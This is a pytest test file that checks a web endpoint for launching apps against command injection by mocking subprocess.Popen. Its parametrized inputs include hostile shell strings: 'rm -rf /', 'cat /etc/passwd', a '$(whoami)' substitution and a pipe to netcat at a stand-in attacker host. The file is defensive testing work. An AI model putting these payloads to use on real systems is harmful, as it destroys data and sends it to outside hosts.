import pytest
import subprocess
from unittest.mock import patch, MagicMock
from app import app


@pytest.mark.parametrize("app_name", [
    "valid_app",                          # Valid whitelist case
    "app; rm -rf /",                      # Command injection attempt
    "app && cat /etc/passwd",             # Command chaining attempt
    "app$(whoami)",                       # Command substitution attempt
    "app|nc attacker.com 4444",           # Pipe to exfiltrate data
])
def test_app_start_endpoint_prevents_command_injection(app_name):
    """Invariant: The /api/start/<app_name> endpoint must not execute arbitrary shell commands regardless of app_name input."""
    
    client = app.test_client()
    
    with patch('subprocess.Popen') as mock_popen:
        mock_popen.return_value = MagicMock()
        
        response = client.get(f'/api/start/{app_name}')
        
        # If endpoint rejects invalid input, it should return 400/403
        # If it accepts, Popen must be called with safe arguments (list, not shell=True)
        if response.status_code in [200, 201]:
            # Verify Popen was called with a list (safe) not a string (shell injection risk)
            assert mock_popen.called, "Popen should be called for valid apps"
            call_args = mock_popen.call_args
            
            # Ensure shell=False or not set (defaults to False)
            assert call_args.kwargs.get('shell', False) is False, \
                "Popen must not use shell=True"
            
            # Ensure first argument is a list, not a string
            assert isinstance(call_args[0][0], list), \
                "Popen args must be a list, not a shell string"
            
            # Verify app_name is not directly interpolated into command
            cmd_str = ' '.join(call_args[0][0])
            assert not any(char in cmd_str for char in [';', '|', '&', '$', '`']), \
                "Command must not contain shell metacharacters from user input"
        else:
            # Endpoint correctly rejected suspicious input
            assert response.status_code in [400, 403, 404], \
                "Invalid app_name should be rejected"